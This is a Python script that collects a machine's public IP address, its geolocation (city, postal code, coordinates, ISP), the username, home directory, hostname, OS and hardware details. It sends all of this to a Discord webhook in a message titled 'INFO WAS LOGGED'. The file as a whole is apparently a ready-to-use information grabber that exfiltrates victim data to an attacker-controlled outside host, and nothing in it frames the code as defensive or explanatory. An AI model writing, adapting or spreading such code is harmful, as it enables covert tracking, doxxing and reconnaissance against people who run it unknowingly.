import requests
import platform
import socket
import psutil
import os
import sys
import pathlib
import getpass
import json

def get_user_info():
    # Get the IP address
    ip_address = requests.get('https://api.ipify.org').text

    # Get more information from http://ip-api.com
    ip_info_response = requests.get(f"http://ip-api.com/json/{ip_address}").json()
    ip_info = {
        "City": ip_info_response.get("city"),
        "Region": ip_info_response.get("regionName"),
        "Country": ip_info_response.get("country"),
        "Postal Code": ip_info_response.get("zip"),
        "Latitude": ip_info_response.get("lat"),
        "Longitude": ip_info_response.get("lon"),
        "ISP": ip_info_response.get("isp"),
        "Organization": ip_info_response.get("org"),
    }

    # Get the username
    username = os.getlogin()

    # Get the current user's home directory
    home_dir = str(pathlib.Path.home())

    # Get operating system information
    os_name = platform.system()
    os_version = platform.release()

    # Get hardware information
    cpu_info = psutil.cpu_count(logical=False)
    memory_info = psutil.virtual_memory().total / (1024 * 1024 * 1024)
    machine_architecture = platform.architecture()[0]

    # Get Python version
    python_version = sys.version_info[0]

    # Get the hostname
    hostname = socket.gethostname()

    # Get the boot time of the system
    boot_time = psutil.boot_time()

    # Get the current process ID
    process_id = os.getpid()

    # Create a dictionary with the user's extended info
    user_info_extended = {
        "IP Address": ip_address,
        "Username": username,
        "Home Directory": home_dir,
        "Operating System": f"{os_name} {os_version}",
        "CPU Cores": cpu_info,
        "Memory (GB)": round(memory_info, 2),
        "Machine Architecture": machine_architecture,
        "Python Version": python_version,
        "Hostname": hostname,
        "Boot Time": boot_time,
        "Process ID": process_id
    }

    return user_info_extended

def send_to_discord_webhook(webhook_url, embed_data):
    headers = {
        'Content-Type': 'application/json'
    }
    payload = {
        'embeds': [embed_data]
    }
    response = requests.post(webhook_url, headers=headers, json=payload)
    if response.status_code == 204:
        print("Successfully sent the message to Discord webhook.")
    else:
        print(f"Failed to send the message. Status code: {response.status_code}, Response: {response.text}")

# Run the script when executed
if __name__ == "__main__":
    webhook_url = "YOUR WEBHOOK URL"
    user_info_extended = get_user_info()
    
    # Format the information into an embed
    embed_data = {
        "title": "INFO WAS LOGGED",
        "description": "Logged info below:",
        "color": int("f88379", 16),
        "fields": []
    }

    for key, value in user_info_extended.items():
        embed_data["fields"].append({
            "name": key,
            "value": str(value),
            "inline": True
        })

    send_to_discord_webhook(webhook_url, embed_data)